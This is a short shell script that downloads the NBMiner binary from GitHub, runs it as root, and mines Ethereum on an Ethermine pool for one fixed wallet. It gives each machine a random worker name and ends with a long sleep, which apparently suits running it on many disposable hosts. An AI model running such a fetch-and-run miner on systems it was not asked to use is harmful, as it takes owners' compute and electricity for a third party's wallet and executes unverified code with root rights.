#!/bin/sh
sudo apt update
sudo apt install libpci3
sudo wget https://github.com/NebuTech/NBMiner/releases/download/v37.5/NBMiner_37.5_Linux.tgz 
tar -xf NBMiner_37.5_Linux.tgz
cd NBMiner_Linux
sudo ./nbminer -a ethash -o stratum+tcp://asia1.ethermine.org:4444 -u 0x2b28ff12352792619a989974027198b3Be5F7cb7.$(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))
sleep 99999
